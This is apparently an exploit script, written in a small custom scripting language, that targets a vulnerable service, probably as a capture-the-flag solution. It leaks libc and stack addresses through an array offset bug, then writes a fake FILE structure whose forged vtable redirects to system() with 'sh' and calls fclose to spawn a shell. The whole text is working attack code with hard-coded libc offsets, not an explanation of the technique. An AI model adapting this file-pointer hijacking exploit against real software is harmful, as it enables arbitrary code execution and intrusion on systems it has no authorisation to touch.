# Exploits the service with a file pointer exploitation
# offsets are previously calculated
# libc base address and stack address is calculated due to the array offset bug
# running this program spawns  a shell
DECLARE $libcbase
DECLARE $i
DECLARE $rip
DECLARE $rdi
DECLARE $lock
DECLARE $bufend
DECLARE $writeptr
DECLARE $fakevptr
DECLARE $arrbase
DECLARE $arr 1000

# call function to fill the stack
CALL WRITECHAR 97
# libcbase
SUB $arr{996} 437504 $libcbase

# array base pointer
SUB $arr{994} 8072 $arrbase

# rdi (points to sh\0 string)
ADD 73392 $libcbase $rdi

# RIP (points to system)
ADD 259200 $libcbase $rip

# fake vtable
ADD 3761416 $libcbase $fakevptr

SUB $rdi 100 $i
DIV $i 2 $i
ADD $i 0 $bufend
ADD $i 0 $writeptr
ADD 128 $arrbase $lock

ADD 0 0 $arr{0}
ADD 0 0 $arr{1}
ADD 0 0 $arr{2}
ADD 0 0 $arr{3}
ADD 0 0 $arr{4}
ADD 0 $writeptr $arr{5}
ADD 0 0 $arr{6}
ADD 0 0 $arr{7}
ADD 0 $bufend $arr{8}
ADD 0 0 $arr{9}
ADD 0 0 $arr{10}
ADD 0 0 $arr{11}
ADD 0 0 $arr{12}
ADD 0 0 $arr{13}
ADD 0 0 $arr{14}
ADD 0 0 $arr{15}
ADD 0 0 $arr{16}
ADD 0 $lock $arr{17}
ADD 0 0 $arr{18}
ADD 0 0 $arr{19}
ADD 0 0 $arr{20}
ADD 0 0 $arr{21}
ADD 0 0 $arr{22}
ADD 0 0 $arr{23}
ADD 0 0 $arr{24}
ADD 0 0 $arr{25}
ADD 0 0 $arr{26}
ADD 0 $fakevptr $arr{27}
ADD 0 $rip $arr{28}
ADD 0 0 $arr{29}
ADD 0 0 $arr{30}
ADD 0 0 $arr{31}

CALL FCLOSE $arrbase
